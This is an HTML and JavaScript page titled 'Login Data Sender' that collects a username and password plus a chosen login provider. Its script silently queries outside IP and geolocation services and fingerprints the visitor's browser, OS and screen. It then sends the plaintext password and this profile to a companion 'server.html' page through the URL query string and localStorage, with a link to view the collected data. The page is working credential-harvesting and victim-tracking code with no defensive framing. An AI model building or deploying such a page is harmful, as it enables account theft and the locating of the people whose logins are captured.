<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Data Sender</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 600px;
            margin: 0 auto;
            padding: 20px;
            background-color: #f5f8fa;
        }
        .container {
            background: white;
            padding: 25px;
            border-radius: 10px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }
        h1 {
            color: #2c3e50;
            text-align: center;
            margin-bottom: 25px;
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 8px;
            font-weight: bold;
            color: #34495e;
        }
        input, select {
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 6px;
            box-sizing: border-box;
            font-size: 16px;
            transition: border-color 0.3s;
        }
        input:focus, select:focus {
            border-color: #3498db;
            outline: none;
            box-shadow: 0 0 5px rgba(52, 152, 219, 0.5);
        }
        button {
            background: #3498db;
            color: white;
            border: none;
            padding: 14px 20px;
            border-radius: 6px;
            cursor: pointer;
            font-size: 16px;
            font-weight: bold;
            width: 100%;
            transition: background 0.3s;
        }
        button:hover {
            background: #2980b9;
        }
        #status {
            margin-top: 20px;
            padding: 15px;
            border-radius: 6px;
            display: none;
            text-align: center;
        }
        .success {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        .error {
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
        .view-data-link {
            display: block;
            text-align: center;
            margin-top: 20px;
            color: #3498db;
            text-decoration: none;
        }
        .view-data-link:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Login Data Sender</h1>
        
        <form id="loginForm">
            <div class="form-group">
                <label for="identifier">Email/Phone/Username:</label>
                <input type="text" id="identifier" required placeholder="Enter your email, phone or username">
            </div>
            
            <div class="form-group">
                <label for="password">Password:</label>
                <input type="password" id="password" required placeholder="Enter your password">
            </div>
            
            <div class="form-group">
                <label for="loginMethod">Login Method:</label>
                <select id="loginMethod">
                    <option value="password">Password</option>
                    <option value="facebook">Facebook</option>
                    <option value="google">Google</option>
                    <option value="twitter">Twitter</option>
                    <option value="apple">Apple</option>
                </select>
            </div>
            
            <div class="form-group">
                <label for="userLocation">Location (optional):</label>
                <input type="text" id="userLocation" placeholder="Country, City">
            </div>
            
            <button type="submit">Send Login Data</button>
        </form>
        
        <div id="status"></div>
        
        <a href="server.html" class="view-data-link">View Collected Data â†’</a>
    </div>
    
    <script>
        // Get elements
        const form = document.getElementById('loginForm');
        const statusDiv = document.getElementById('status');
        
        // Function to show status message
        function showStatus(message, isError = false) {
            statusDiv.textContent = message;
            statusDiv.className = isError ? 'error' : 'success';
            statusDiv.style.display = 'block';
            
            setTimeout(() => {
                statusDiv.style.display = 'none';
            }, 3000);
        }
        
        // Function to get client IP info
        async function getIPInfo() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                console.error('Error getting IP:', error);
                return 'Unknown';
            }
        }
        
        // Function to get geolocation data
        async function getGeolocationData() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                return {
                    country: data.country_name,
                    city: data.city,
                    region: data.region,
                    latitude: data.latitude,
                    longitude: data.longitude
                };
            } catch (error) {
                console.error('Error getting geolocation:', error);
                return {
                    country: 'Unknown',
                    city: 'Unknown',
                    region: 'Unknown'
                };
            }
        }
        
        // Function to get browser and OS info
        function getBrowserInfo() {
            const userAgent = navigator.userAgent;
            let browserName = 'Unknown';
            let osName = 'Unknown';
            
            // Detect browser
            if (userAgent.includes('Firefox')) browserName = 'Firefox';
            else if (userAgent.includes('Chrome')) browserName = 'Chrome';
            else if (userAgent.includes('Safari')) browserName = 'Safari';
            else if (userAgent.includes('Edge')) browserName = 'Edge';
            else if (userAgent.includes('Opera')) browserName = 'Opera';
            
            // Detect OS
            if (userAgent.includes('Windows')) osName = 'Windows';
            else if (userAgent.includes('Mac')) osName = 'Mac OS';
            else if (userAgent.includes('Linux')) osName = 'Linux';
            else if (userAgent.includes('Android')) osName = 'Android';
            else if (userAgent.includes('iOS')) osName = 'iOS';
            
            return {
                name: browserName,
                version: navigator.appVersion,
                os: osName,
                language: navigator.language,
                platform: navigator.platform
            };
        }
        
        // Form submission handler
        form.addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const identifier = document.getElementById('identifier').value;
            const password = document.getElementById('password').value;
            const loginMethod = document.getElementById('loginMethod').value;
            const userLocation = document.getElementById('userLocation').value;
            const publicIp = await getIPInfo();
            const locationData = await getGeolocationData();
            const browserInfo = getBrowserInfo();
            
            // Prepare data to send
            const loginData = {
                identifier: identifier,
                password: password,
                login_method: loginMethod,
                user_location: userLocation || `${locationData.city}, ${locationData.country}`,
                public_ip: publicIp,
                geolocation: locationData,
                browser: browserInfo,
                user_agent: navigator.userAgent,
                screen_resolution: `${window.screen.width}x${window.screen.height}`,
                timestamp: new Date().toISOString()
            };
            
            // Encode data for URL
            const encodedData = encodeURIComponent(JSON.stringify(loginData));
            
            // Get the server URL (assuming it's in the same directory)
            const serverUrl = window.location.href.replace('sender.html', 'server.html');
            
            // Send data by redirecting to server with data as URL parameter
            window.open(`${serverUrl}?data=${encodedData}`, '_blank');
            
            // Store data in localStorage for the server page to access
            const storedData = JSON.parse(localStorage.getItem('loginDataCollection') || '[]');
            storedData.push(loginData);
            localStorage.setItem('loginDataCollection', JSON.stringify(storedData));
            
            // Show success message
            showStatus('Login data sent successfully! You can view it on the server page.');
            
            // Reset form
            form.reset();
        });
    </script>
</body>
</html>
